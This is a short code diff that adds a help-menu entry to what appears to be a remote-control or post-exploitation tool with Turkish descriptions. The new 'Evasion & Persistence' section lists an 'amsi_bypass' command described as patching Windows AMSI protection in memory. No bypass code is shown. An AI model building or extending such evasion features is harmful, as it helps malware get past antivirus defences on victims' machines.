@@ -300,6 +300,9 @@ class Handler(BaseHandler):
   runmodule <name> [func] - Yüklü modülü çalıştır
   listmodules           - Yüklü modülleri listele
 
+[Evasion & Persistence]
+  amsi_bypass           - Windows AMSI korumasını bellekte patchle (Bypass)
+
 ═══════════════════════════════════════════════════════════════════
 """
                     print(help_text)
